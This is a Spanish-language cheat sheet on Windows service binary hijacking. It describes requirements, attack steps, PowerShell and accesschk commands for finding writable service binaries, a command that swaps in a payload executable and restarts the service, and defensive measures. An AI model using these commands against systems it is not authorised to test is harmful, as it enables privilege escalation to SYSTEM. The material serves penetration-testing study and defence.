## Service Binary Hijacking - Cheat Sheet

### Concepto

Service Binary Hijacking es una técnica de persistencia o escalada de privilegios que aprovecha servicios de Windows mal configurados para ejecutar código arbitrario con privilegios elevados. Esto ocurre cuando el ejecutable configurado en un servicio puede ser reemplazado o redirigido hacia uno malicioso por un atacante con permisos de escritura.

### Requisitos

* El atacante debe tener acceso a una sesión interactiva en el sistema.
* Permisos de escritura sobre el binario del servicio o la carpeta donde reside.
* Capacidad de reiniciar el servicio (opcional, si el servicio se reinicia automáticamente).
* El servicio debe estar configurado para ejecutarse con privilegios elevados (e.g., LocalSystem).

### Flujo de ataque

1. **Enumerar servicios vulnerables**: Buscar servicios que corran como SYSTEM o usuarios privilegiados y cuyos binarios sean modificables por usuarios de bajo privilegio.
2. **Verificar permisos sobre el binario**: Determinar si el usuario tiene permisos de escritura sobre el ejecutable configurado.
3. **Reemplazar el binario**: Sustituir el binario legítimo por uno malicioso (e.g. una reverse shell o payload).
4. **Reiniciar el servicio**: Activar el servicio para ejecutar el binario malicioso con privilegios elevados.
5. **Obtener acceso**: Establecer una shell elevada o mantener persistencia.

### Herramientas útiles

* `accesschk` (Sysinternals): Para verificar permisos sobre archivos/bibliotecas.
* `PowerUp` (PowerShell): Para automatizar la búsqueda de servicios vulnerables.
* `SetACL`: Para comprobar o modificar ACLs.
* `Process Monitor`: Para observar rutas de ejecución y permisos.
* `sc.exe`: Comando nativo para controlar servicios.
* `Get-Service`, `Get-WmiObject`, `Get-CimInstance`: Cmdlets de PowerShell para enumeración.

### Comandos de enumeración

```powershell
# Listar todos los servicios y sus rutas
Get-WmiObject win32_service | Select-Object Name, StartName, PathName | Format-Table -AutoSize

# Filtrar servicios con binarios en rutas potencialmente inseguras
Get-WmiObject win32_service | Where-Object { $_.PathName -match "Users|Temp|\ProgramData" } | Select Name, StartName, PathName

# Revisar permisos sobre el binario
$services = Get-WmiObject win32_service
foreach ($s in $services) {
  $path = $s.PathName -replace '"','' -split ' ')[0]
  if (Test-Path $path) {
    Write-Output "Checking $($s.Name): $path"
    icacls $path
  }
}

# Enumeración rápida con PowerUp
Invoke-AllChecks | Out-File powerup_enum.txt

# Usar accesschk para revisar permisos
accesschk.exe -uwcqv "USERNAME" "C:\Ruta\al\servicio.exe"
```

### Comandos útiles

```powershell
# Cambiar binario (requiere permisos de escritura)
copy C:\Users\user\payload.exe "C:\Program Files\Vulnerable Service\service.exe"

# Reiniciar servicio
sc stop NombreDelServicio
sc start NombreDelServicio
```

### Indicadores clave de vulnerabilidad

* El servicio corre como `LocalSystem` o `NT AUTHORITY\SYSTEM`.
* El binario se encuentra en una ruta donde el usuario actual tiene permisos de escritura.
* No hay verificación de integridad del binario.

### Detección / Defensa

* Monitoreo de cambios en binarios de servicios.
* Uso de AppLocker o Software Restriction Policies.
* Control estricto de ACLs en archivos binarios.
* Configuración de servicios con rutas seguras y permisos mínimos.

### Referencias

* [https://attack.mitre.org/techniques/T1574/010/](https://attack.mitre.org/techniques/T1574/010/)
* [https://book.hacktricks.xyz/windows-hardening/privilege-escalation/service-binary-path-hijacking](https://book.hacktricks.xyz/windows-hardening/privilege-escalation/service-binary-path-hijacking)
